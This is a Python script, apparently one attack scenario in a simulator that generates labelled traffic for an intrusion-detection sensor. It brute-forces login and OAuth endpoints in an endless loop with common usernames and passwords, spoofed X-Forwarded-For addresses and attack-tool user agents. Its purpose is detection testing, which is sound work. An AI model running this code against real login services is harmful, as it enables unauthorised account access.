"""Credential / auth abuse (brute force, credential stuffing, auth bypass).

Repeatedly POSTs guesses to auth endpoints. Non-2xx responses on auth paths are
scored as failed logins by the sensor.

Signature -> model class: R2L (remote-to-local)
"""

import random
import time

import requests

from config import ATTACKER_IPS, REQUEST_TIMEOUT, TARGET_URL

AUTH_ENDPOINTS = [
    "/login", "/signin", "/api/auth/login", "/api/v1/session",
    "/oauth/token", "/v2/auth/bypass", "/account/login",
]

USERNAMES = ["admin", "root", "administrator", "test", "user", "netflix", "support"]
PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "root", "changeme"]

ATTACK_UAS = ["python-requests/2.31.0", "hydra", "Go-http-client/1.1"]


def run(stop=None):
    """Loop until `stop` (a threading.Event) is set, or forever if None."""
    print(f"[credential] brute-forcing auth endpoints on {TARGET_URL}")
    attempts = 0
    while not (stop and stop.is_set()):
        try:
            headers = {
                "X-Forwarded-For": random.choice(ATTACKER_IPS),
                "X-Sim-Scenario": "credential",  # ground-truth tag (not a model feature)
                "User-Agent": random.choice(ATTACK_UAS),
                "Content-Type": "application/json",
            }
            endpoint = random.choice(AUTH_ENDPOINTS)
            creds = {
                "username": random.choice(USERNAMES),
                "password": random.choice(PASSWORDS),
            }
            requests.post(
                f"{TARGET_URL}{endpoint}", json=creds, headers=headers,
                timeout=REQUEST_TIMEOUT,
            )
            attempts += 1
            if attempts % 20 == 0:
                print(f"[credential] {attempts} login attempts sent")
        except Exception:
            pass
        time.sleep(random.uniform(0.05, 0.2))


if __name__ == "__main__":
    run()
